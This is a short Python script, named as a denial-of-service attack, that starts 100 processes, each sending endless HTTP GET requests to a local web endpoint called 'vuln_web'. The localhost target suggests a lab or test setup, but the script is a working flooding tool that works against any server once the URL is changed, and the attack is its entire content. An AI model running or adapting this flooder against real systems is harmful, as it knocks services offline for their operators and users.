from multiprocessing import Pool
import requests

def dos_attack(arg):
	while True:
		print("getting "+str(arg[1]))
		arg[0].get("http://localhost:8000/vuln_web")

if __name__ == '__main__':		
	p = Pool(100)
	p.map(dos_attack, [[requests.Session(), i] for i in range(100)])